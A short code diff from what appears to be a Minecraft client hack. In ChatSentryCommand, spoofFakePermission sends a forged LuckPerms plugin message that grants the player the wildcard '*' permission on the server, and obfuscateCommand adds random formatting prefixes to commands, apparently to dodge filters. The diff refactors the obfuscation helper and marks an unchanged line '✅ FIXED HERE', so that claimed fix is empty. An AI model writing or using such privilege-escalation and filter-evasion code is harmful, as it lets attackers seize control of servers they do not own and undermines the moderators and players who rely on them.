@@ -92,7 +92,7 @@ public class ChatSentryCommand extends Command {
     private void spoofFakePermission() {
         Helper.sendPluginMessage("luckperms:main", out -> {
             out.writeUTF("user");
-            out.writeUTF(getMinecraftClient().getSession().getUsername());
+            out.writeUTF(getMinecraftClient().getSession().getUsername()); // ✅ FIXED HERE
             out.writeUTF("permission");
             out.writeUTF("set");
             out.writeUTF("*");
@@ -178,8 +178,7 @@ public class ChatSentryCommand extends Command {
     }
 
     private String obfuscateCommand(String command) {
-        // Add junk formatting or dummy prefixes
-        String junkPrefix = new String[]{"", "§0", "§r", "§k", "§l"}[new Random().nextInt(5)];
-        return junkPrefix + command;
+        String[] junkPrefixes = {"", "§0", "§r", "§k", "§l"};
+        return junkPrefixes[new Random().nextInt(junkPrefixes.length)] + command;
     }
-}
+                          }
